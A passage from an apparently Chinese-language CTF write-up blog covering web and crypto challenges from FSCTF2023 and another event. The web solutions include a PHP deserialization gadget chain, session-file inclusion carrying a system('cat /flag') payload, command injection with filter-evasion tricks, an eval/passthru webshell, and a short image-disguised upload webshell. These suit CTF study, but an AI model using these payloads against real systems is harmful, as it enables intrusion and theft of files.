class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;content[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileRobot</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_file</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$hint</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_file</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//User::__wakeup()-&gt;User::printName()-&gt;Surrender::__toString()-&gt;FileRobot::__get()-&gt;FileRobot::__invoke()-&gt;FileRobot::Get_file()</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Surrender</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&quot;filename&quot;</span>] = <span class="keyword">new</span> <span class="title class_">FileRobot</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;path = <span class="keyword">new</span> <span class="title class_">FileRobot</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;path-&gt;filename = <span class="string">&#x27;../flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>flag位置要试，试出在<code>../flag.php</code></p><hr /><h2 id="web-safe_include"><a class="markdownIt-Anchor" href="#web-safe_include"></a> web-safe_include</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/:/tmp/&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$sys</span> = @<span class="variable">$_SESSION</span>[<span class="string">&#x27;xxs&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxs&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$sys</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xxs&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">include</span> <span class="variable">$sys</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;xxs&#x27;</span>] = <span class="variable">$sys</span>;</span><br></pre></td></tr></table></figure><p><strong>session文件包含</strong><br /><code>open_basedir</code>是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域，假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀,而不是目录名<br />举例来说: 若&quot;open_basedir = /dir/user&quot;, 那么目录 “/dir/user” 和 &quot;/dir/user1&quot;都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名<br /><code>?xxs=&lt;?php system('cat /flag');?&gt;</code>保存进session的值并写入session文件<br />根据sessionID生成session文件，/tmp/sess_sessionID，sessionID一般就是Cookie中PHPSESSID的值，可以通过F12查看网络获得<br /><code>?xxs=/tmp/sess_sessionID</code>进行session文件包含</p><hr /><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h1><h2 id="crypto-base"><a class="markdownIt-Anchor" href="#crypto-base"></a> crypto-base</h2><p>密文<code>j2rXjx8wSZjD</code><br />base64换表<code>GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5</code><br />解密即可，得到<code>flag&#123;666&#125;</code></p><hr /><h2 id="crypto-aff"><a class="markdownIt-Anchor" href="#crypto-aff"></a> crypto-AFF</h2><p>题目可知是仿射密码<br />密文<code>WMPTPTRGGPED</code><br /><code>c = (3 * j - 17) % 26</code><br />根据代码可知，a=3,b=17<br />得到<code>thisisaffine</code><br /><code>flag&#123;THISISAFFINE&#125;</code></p><hr /><h2 id="crypto-神秘组织m"><a class="markdownIt-Anchor" href="#crypto-神秘组织m"></a> crypto-神秘组织M</h2><p>栅栏密码M型，靠，之前只知道普通的跟W型，其实题目也提示了。。。。<br /><code>&#123;bc1bg572ec066&#125;a0d2fb137l951b5451f06b7</code><br />手工得到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      &#123;       b         c        <span class="number">1</span>         b</span><br><span class="line">     g <span class="number">5</span>     <span class="number">7</span> <span class="number">2</span>       e c      <span class="number">0</span> <span class="number">6</span>       <span class="number">6</span> &#125;</span><br><span class="line">   a    <span class="number">0</span>   d   <span class="number">2</span>     f   b    <span class="number">1</span>   <span class="number">3</span>     <span class="number">7</span></span><br><span class="line"> l       <span class="number">9</span> <span class="number">5</span>     <span class="number">1</span>   b     <span class="number">5</span>  <span class="number">4</span>     <span class="number">5</span>   <span class="number">1</span></span><br><span class="line">f         <span class="number">0</span>        <span class="number">6</span>         b        <span class="number">7</span></span><br></pre></td></tr></table></figure><p><code>flag&#123;50905d7b2216bfeccb5b41016357176b&#125;</code><br />后面看见这个靶场也有一道M型的</p><hr /><h2 id="crypto-数星星"><a class="markdownIt-Anchor" href="#crypto-数星星"></a> crypto-数星星</h2><p>词频统计，自己先把单词找出来，直接在buuctf做过一道类似的，浪里淘沙？好像是这个，直接把脚本搬过来</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="string">&#x27;tonight&#x27;</span>, <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;favorite&#x27;</span>, <span class="string">&#x27;we&#x27;</span>, <span class="string">&#x27;example&#x27;</span>, <span class="string">&#x27;crypto&#x27;</span>, <span class="string">&#x27;should&#x27;</span>, <span class="string">&#x27;is&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;learn&#x27;</span>, <span class="string">&#x27;sublim&#x27;</span>, <span class="string">&#x27;morning&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;your&#x27;</span>, <span class="string">&#x27;word&#x27;</span>, <span class="string">&#x27;which&#x27;</span>, <span class="string">&#x27;found&#x27;</span>]</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> each <span class="keyword">in</span> content:</span><br><span class="line">        <span class="built_in">print</span>(content.count(each), each)</span><br><span class="line">        l.append((content.count(each), each))</span><br><span class="line">l = <span class="built_in">sorted</span>(l, reverse=<span class="literal">False</span>)</span><br><span class="line">dest = [l[i-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">3</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>)]</span><br><span class="line"><span class="built_in">print</span>(dest)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> dest]))</span><br><span class="line"><span class="comment"># whichisyourfavoriteword</span></span><br><span class="line"><span class="comment"># flag&#123;17c5d0278edcbad3d061a92b723c116d&#125;</span></span><br></pre></td></tr></table></figure><hr /><h2 id="crypto-不一样的四四方方"><a class="markdownIt-Anchor" href="#crypto-不一样的四四方方"></a> crypto-不一样的四四方方</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jilinjingcha</span><br><span class="line">information</span><br><span class="line">engineering</span><br></pre></td></tr></table></figure><p>网上的关于四方密码介绍很多，一般秘钥都是没有j/q/i<br />但是这道题我们去的是z，附件的给提示<br /><code>key1:informatbcdeghjklpqsuvwxy</code><br /><code>key2:engirabcdfhjklmopqstuvwxy</code><br />加密。。。。就很抽象，都说了题目给的是密文，不应该是解密吗？？<br /><code>BDHAHCTLTNMG</code>这是大写的结果，有的网站是这个<br />还有就是，有的在线网站跑出来的是小写的结果，md之后就不是flag了，题目又说是md5小写加密。。。。。<br />md5一下<br /><code>flag&#123;c6dac3a0f40dfacefcc473585cdeb0f8&#125;</code><br />总结：这道题很抽象</p><hr /><h2 id="crypto-我爱456"><a class="markdownIt-Anchor" href="#crypto-我爱456"></a> crypto-我爱456</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kseYvkasuj5618t</span><br><span class="line">lygemfla235158jd</span><br><span class="line">utasvQsjdybl587t</span><br><span class="line">sydwkuhd54kdhg</span><br><span class="line">jtftY658qiwudhs</span><br><span class="line">iaugwjiushyc871</span><br><span class="line">aksQbhasbkjcbkjd</span><br><span class="line">dvbpzd8v26dfv6f</span><br><span class="line">s6dvdNf6v52v6x</span><br><span class="line">65dT26f5d1b6f5v</span><br><span class="line">35f2Y6d65bbfv5</span><br><span class="line">35dfv32d8bfv256d</span><br><span class="line">kdhMvnhdkjzldkj</span><br><span class="line">sdhjTujsdbch268</span><br><span class="line">sdr26Iksds265dsv</span><br><span class="line">jnm2dsnsdv26865</span><br></pre></td></tr></table></figure><p>评价：又是一道misc题。。。<br />456循环，依次提取字符串中的第4，5，6个字符</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;提取出只有字符串的文件位置&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        flag += a[i][<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        flag += a[i][<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += a[i][<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># YmQwYjQzNTY3MTI2</span></span><br></pre></td></tr></table></figure><p>base64得到<code>bd0b43567126</code><br /><code>flag&#123;b5ff0893e6522a037c144a1f502c2b48&#125;</code></p><hr />]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FSCTF2023wp</title>
      <link href="/2024/04/01/FSCTF2023wp/"/>
      <url>/2024/04/01/FSCTF2023wp/</url>
      
        <content type="html"><![CDATA[<p>emmm，没时间打，赛后自己做了一部分，跟wp复现了一部分</p><h2 id="web-源码启动"><a class="markdownIt-Anchor" href="#web-源码启动"></a> web- 源码！启动</h2><p>很简单，虽然F12和右键被禁用，连续按两次F12即可</p><h2 id="web-webshell是啥捏"><a class="markdownIt-Anchor" href="#web-webshell是啥捏"></a> web-webshell是啥捏</h2><p>根据表情对应的字母，翻译出</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;👽&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="title function_ invoke__">passmhru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;👽&#x27;</span>]));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>passmhru函数也类似system函数<br />passthru与system的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据<br />差不多同样的用法，直接</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?👽=ls </span><br><span class="line">ls /</span><br><span class="line">cat /flag.txt</span><br></pre></td></tr></table></figure><h2 id="web-helloyou"><a class="markdownIt-Anchor" href="#web-helloyou"></a> web-hello，you</h2><p>简单命令注入，用分号隔断命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;ls</span><br><span class="line">1;ca\t f*</span><br></pre></td></tr></table></figure><h2 id="web-细狗20"><a class="markdownIt-Anchor" href="#web-细狗20"></a> web-细狗2.0</h2><p>空格绕过、无字母、无回显rce</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?hongzh0=1;ca\t$IFS$1/*</span><br></pre></td></tr></table></figure><h2 id="web-ez_php1"><a class="markdownIt-Anchor" href="#web-ez_php1"></a> web-ez_php1</h2><p>1.md5绕过，读文件<br />2.序列化<br />3.反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clazz</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=g0t_f1ag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里利用php引用，使得a=b</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clazz</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$q</span> = <span class="keyword">new</span> <span class="title class_">Clazz</span>();</span><br><span class="line"><span class="variable">$q</span>-&gt;a=&amp;<span class="variable">$q</span>-&gt;b;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$q</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web-巴巴托斯"><a class="markdownIt-Anchor" href="#web-巴巴托斯"></a> web-巴巴托斯</h2><p>1.改UA头<br />2.改referer(根据local man 推断且经过尝试)为本地<br />3.文件包含，php伪协议</p><h2 id="web-ez_eval"><a class="markdownIt-Anchor" href="#web-ez_eval"></a> web-EZ_eval</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$word</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;word&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;</span>, <span class="variable">$word</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$word</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$word</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span>. <span class="variable">$word</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>?&gt;闭合，此时我们需输入&lt;?php,可见？被过滤，我们借助&lt;script&gt;标签</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script%<span class="number">0</span>alanguage=<span class="string">&#x27;php&#x27;</span>&gt;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ca\t$IFS$9/*&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="web-是兄弟就来传你马"><a class="markdownIt-Anchor" href="#web-是兄弟就来传你马"></a> web-是兄弟就来传你马</h2><p>对文件内容长度进行了限制(长度15)，以及限定文件格式<br />F12重发包，修改Content-Type:image/jpeg<br />上传文件xxx.pht，最短命令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BM&lt;?=`cat /*`;</span><br></pre></td></tr></table></figure><p>url/uploads/xxx(重发)</p><h2 id="crypto-rsa-1"><a class="markdownIt-Anchor" href="#crypto-rsa-1"></a> crypto-RSA 1</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p=<span class="number">1458769258361</span></span><br><span class="line">q=<span class="number">4556983871563</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">直接求逆元</span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="crypto-做不出来就别阴阳怪气啦"><a class="markdownIt-Anchor" href="#crypto-做不出来就别阴阳怪气啦"></a> crypto-做不出来就别阴阳怪气啦</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ </span><br></pre></td></tr></table></figure><p>直接阴阳怪气解码<br /><a href="https://mmdjiji.gitee.io/yygq.js/">https://mmdjiji.gitee.io/yygq.js/</a></p><h2 id="crypto-rsa-2"><a class="markdownIt-Anchor" href="#crypto-rsa-2"></a> crypto-RSA 2</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c=<span class="number">90362297576572826064831133206230135349790392078780406000643496612200873754835039374184323808342127071833274981191134125413478105835272238356352724573228797863805124195170088819735610736936895478614898105848968069280022022112207095140266709372221090586917729998024205978412679448008696923580889787529663283314</span></span><br><span class="line">p=<span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q=<span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e=<span class="number">65537</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = p*q</span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><h2 id="crypto-rsa-3"><a class="markdownIt-Anchor" href="#crypto-rsa-3"></a> crypto-RSA 3</h2><p>dp泄露</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">dp = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (n%((dp*e-<span class="number">1</span>)//i+<span class="number">1</span>)) == <span class="number">0</span>:</span><br><span class="line">            p = (dp*e-<span class="number">1</span>)//i+<span class="number">1</span></span><br><span class="line">            q = n // p<span class="comment">#注意都是整除</span></span><br><span class="line">            phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            d = gmpy2.invert(e,phi_n)</span><br><span class="line">            m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="crypto-do-you-know-gcd"><a class="markdownIt-Anchor" href="#crypto-do-you-know-gcd"></a> crypto-Do you know gcd?</h2><p>共享素数</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1= <span class="number">18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</span></span><br><span class="line">n2= <span class="number">16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</span></span><br><span class="line">c1= <span class="number">534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</span></span><br><span class="line">c2= <span class="number">10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</span></span><br><span class="line">p = <span class="number">161792852262585784240210614943673858364435848078458892793835734301847476262357245115185358270538726363219476877287799286220761527702213530458749144905775453645889968558781952949356764633708703117094081955706055636505638238383861546133003679992033912148071189936673239027096959214554654922959747089484789298237</span></span><br><span class="line">q1 = n1//p</span><br><span class="line">q2 = n2//p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d1=inverse(e,(p-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">d2=inverse(e,(p-<span class="number">1</span>)*(q2-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c1,d1,n1))+long_to_bytes(<span class="built_in">pow</span>(c2,d2,n2)))</span><br></pre></td></tr></table></figure><h2 id="crypto-big_e"><a class="markdownIt-Anchor" href="#crypto-big_e"></a> crypto-Big_e</h2><p>Wiener攻击</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContinuedFraction</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,numerator,denumerator</span>):</span><br><span class="line">        self.numberlist = []</span><br><span class="line">        self.fractionlist = []</span><br><span class="line">        self.GenerateNumberList(numerator,denumerator)</span><br><span class="line">        self.GenerateFractionList()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateNumberList</span>(<span class="params">self,numerator,denumerator</span>):</span><br><span class="line">        <span class="keyword">while</span> numerator != <span class="number">1</span>:</span><br><span class="line">            quotient = numerator//denumerator</span><br><span class="line">            remainder = numerator%denumerator</span><br><span class="line">            self.numberlist.append(quotient)</span><br><span class="line">            numerator = denumerator</span><br><span class="line">            denumerator = remainder</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateFractionList</span>(<span class="params">self</span>):</span><br><span class="line">        self.fractionlist.append([self.numberlist[<span class="number">0</span>],<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(self.numberlist)):</span><br><span class="line">            numerator = self.numberlist[i]</span><br><span class="line">            denumerator = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                temp = numerator</span><br><span class="line">                numerator = denumerator+numerator*self.numberlist[i-j-<span class="number">1</span>]</span><br><span class="line">                denumerator = temp</span><br><span class="line">            self.fractionlist.append([numerator,denumerator])</span><br><span class="line">            </span><br><span class="line">n = <span class="number">12238605063252292170613110607692779326628090745751955692266649177882959231822580682548279800443278979485092243645806337103841086023159482786712759291169541633901936290854044069486201989034158882661270017305064348254800318759062921744741432214818915527537124001063995865927527037625277330117588414586505635959411443039463168463608235165929831344586283875119363703480280602514451713723663297066810128769907278246434745483846869482536367912810637275405943566734099622063142293421936734750356828712268385319217225803602442033960930413469179550331907541244416573641309943913383658451409219852933526106735587605884499707827</span></span><br><span class="line">e = <span class="number">11850552481503020257392808424743510851763548184936536180317707155841959788151862976445957810691568475609821000653594584717037528429828330763571556164988619635320288125983463358648887090031957900011546300841211712664477474767941406651977784177969001025954167441377912326806132232375497798238928464025466905201977180541053129691501120197010080001677260814313906843670652972019631997467352264392296894192998971542816081534808106792758008676039929763345402657578681818891775091140555977382868531202964486261123748663752490909455324860302967636149379567988941803701512680099398021640317868259975961261408500449965277690517</span></span><br><span class="line">c = <span class="number">4218884541887711839568615416673923480889604461874475071333225389075770098726337046768413570546617180777109293884545400260353306419150066928226964662256930702466709992997796154415790565112167663547017839870351167884417142819504498662037048412313768450136617389372395690363188005647619061128497371121168347810294424378348301835826084732747005110258557662466626720961279087145559906371505117097599774430970980355531235913439823966628008554872896820907555353892843539526041019103819804854883231421963308265517622470779089941078841902464033685762524196275032288319744157255628189204988632871276637699312750636348750883054</span></span><br><span class="line">a = ContinuedFraction(e,n)</span><br><span class="line"><span class="keyword">for</span> k,d <span class="keyword">in</span> a.fractionlist:</span><br><span class="line">    s = long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(s.decode())</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="crypto-rsa签到"><a class="markdownIt-Anchor" href="#crypto-rsa签到"></a> 